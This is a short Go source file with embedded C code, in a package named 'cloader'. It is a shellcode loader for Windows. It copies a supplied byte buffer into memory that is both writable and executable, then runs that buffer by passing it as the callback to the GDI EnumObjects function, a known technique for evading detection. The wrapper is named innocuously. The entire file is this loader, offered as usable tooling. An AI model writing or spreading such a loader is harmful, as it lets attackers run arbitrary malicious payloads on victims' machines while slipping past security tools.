package cloader

/*
#include <windows.h>

void enumObjects(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        LOGFONTW lf = { 0 };
    	lf.lfCharSet = DEFAULT_CHARSET;
    	HDC dc = GetDC(0);
   	 	EnumObjects(dc, OBJ_BRUSH, (GOBJENUMPROC)addr, 0);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func EnumObjects(p []byte) {
	C.enumObjects((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
